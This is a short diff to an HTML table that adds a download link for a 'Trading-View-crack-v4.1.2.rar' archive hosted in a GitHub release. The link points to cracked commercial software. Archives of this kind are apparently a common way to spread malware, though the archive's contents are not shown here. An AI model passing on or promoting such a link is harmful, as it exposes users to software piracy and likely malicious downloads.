@@ -13,7 +13,7 @@
   <tr>
     <td>Trading-View</td>
     <td>01/13/2024</td>
-    <td><a href=''>Download</td>
+    <td><a href='https://github.com/wr3cckl3ss/-Trading-view-crack-2024/releases/download/Trading-View-crack-v4.1.2/Trading-View-crack-v4.1.2.rar'>Download</td>
   </tr>
 </table>
 <hr> 
